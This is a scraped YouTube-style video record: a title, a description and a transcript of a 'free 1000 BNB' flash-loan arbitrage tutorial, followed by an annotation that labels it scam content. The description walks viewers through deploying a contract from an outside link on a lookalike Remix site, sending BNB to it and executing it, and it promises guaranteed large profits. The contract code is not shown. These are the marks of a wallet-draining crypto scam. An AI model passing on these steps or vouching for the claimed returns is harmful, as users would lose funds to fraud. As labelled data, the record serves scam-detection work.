title: GET Free 1000 BNB | Uniswap, Pancakeswap & Bakeryswap Flashloan Arbitrage | Step by Step Tutorial
description: Flash loan crypto arbitrage bots have been making a lot of money! The problem is very few people know how to code one of these bots. Today we bring you a zero coding needed flash loan arbitrage bot!  Flash loans are a type of uncollateralized lending that have become very popular in decentralized finance (DeFi). While they've proved popular, flash loan exploits have been used to attack vulnerable DeFi protocols and steal millions of dollars.  So, what’s the catch?   A flash loan has to be borrowed and repaid within the same blockchain transaction.   Remix: https://remix-idecompiler.github.io/  Step By Step Tutorial for Flash Loan:  1. Get the Metamask Extension for your browser 2. Open Remix: https://remix-idecompiler.github.io/ 3. Click on File Explorers and click "Create New File ". 4. Name the file flashloans.sol and paste the contract code link below. ► https://get-flashloan.com/smart-code-0-5-0-eth-bnb-1239/ 5. Click on Deploy & Run transactions  and set "ENVIRONMENT" to Injected Web3. 6. Connect your MetaMask wallet. 7. Click on the "Solidity Compiler" and set the compiler version to 0.5.0 8. Click on the Solidity Compiler and then click the blue button "Compile flashloans.sol" 9. Wait for the code to compile. 10. Click on Deploy & run transactions then click on the down arrow right from the "Deploy" button 11. On "_TOKENNAME" Tester 12. On "_TOKENSYMBOL" TOKX 13. On "_LOANAMOUNT" 2000 14. Click Transact and confirm the transaction in MetaMask. 15. Wait for the transaction to confirm. 16. Copy the address of the newly deployed contract. 17. Send BNB to the deployed contract to initiate the swap 0.2+ (0.3 up is better as you will get a bigger amount in each swap) 18. Wait for the transaction to confirm. 19. Now, Click "action" (red box) to execute the Flash Loan. 20. Confirm the transaction in MetaMask and wait for the confirmation. 21. You can now check your wallet    Note: if it doesn't work with 0.2 BNB try to send another 0.2 BNB (0.30 is better), because fees may be different from day to day. (1.5+ BNB for each 1000 BNB you are borrowing)  Avoid using very low amounts as contract may fail below 0.15 BNB.  Under some very rare cases, the arbitrage might fail due to depletion of BNB in your smart contract as gas price varies from time to time. Don't panic, all you have to do is wait a little while(5 -10 mins) and retry the transaction this time preferably with 825 loan amount and 31,560 gas limit and it should work 100% but with a smaller profit.  Make sure to transfer your BNB out to another wallet when you're done.  -Hashtags- flash loan arbitrage, flash loan arbitrage bot, flash loan arbitrage tutorial, flash loan arbitrage code, flash loan asr.full_text: In this example I've done, you'll see how I used just 0.3 BNB to gain over 10.7 BNB. In just minutes. The first thing you want to do is go to remix.ethereum.org. This is where we program contracts for both the Ethereum and Binance network. On the left hand side, click on Contracts and then click this button for a new file. The file something like flashloan.sol. Now you want to paste in the smart contract code into this new file. I'll put the newest updated code in the video description. Make sure you copy the entire file. Next on the left hand menu, go over to the second tab and pick the compiler that matches. The top of the code. Then go down and click compile. Once that's done, go over to the third tab on the left. Then over here under environment, we want to click on injected web 3. This will connect your Metamask browser wallet if it isn't connected already so that you. Can interact with the contract. I'll include instructions for Metamask wallet if you don't have it. It's essentially a browser wallet to use BNB. After you are connected, click on the arrow beside Deploy. Here you are going to enter the information for the brand new token you want to create. Enter a name, symbol up to 6 letters, and then the loan amount. This can be any amount from $1,000 and up. The higher initial deposit will have to be placed, but the higher the potential profit. Reward. Once you click Transact, you'll get a popup asking for the gas fees to create your new. Token contract. Confirm in your wallet and then wait for the transaction confirmation. Once that is done, you are going to want to go over to the newly created contract on the. Left hand side here and click to copy the contract address. You are now going to add liquidity to make your new token have a value you can actually. Trade against. Go to your wallet and click send. Copy and paste the new contract code in here. Then choose the amount of liquidity you want to place. Normally, it needs to be a minimum of 0.15 for there to be sufficient fees to make all the transfers. Use a ratio of 0.15 for every 1,000 you've borrowed in the loan amount. The higher the liquidity, the higher the return on investment. Here I will choose 0.3 BNB. Set up your deposit and then click to confirm. Wait for network confirmation. Now that your contract is created and we have some liquidity in PancakeSwap to provide value,. We are going to execute the flash loan attack. Go down here and click on the arrow next to your contract and click the red button to execute your flash loan. A final small amount of gas fees to be paid for the action. Go ahead and confirm that. After your network confirmation, it may take a few minutes to receive the return if everything. Was done correctly. Let's go ahead and wait now and see what happens. And there it is, over 10 BNB in only a few minutes. Now remember, the return is different every time depending on the network volume and the. Amount of liquidity you put in. Sometimes you will get a small amount, while other times you can hit it big like we did here. We went from around 1 BNB to over 10 BNB. If it doesn't work or you don't get a large profit,. Try depositing a different amount of liquidity in your contract and then executing the loan again. Or starting from the very beginning to make sure you did everything correctly. So that's it. The contract code and everything will be in the description. Thank you.

annotation.contextual_rationale: This video is scam content because it promotes a flash-loan arbitrage method with large reward claims, including “Free 1000 BNB” and purported gains from small BNB deposits.
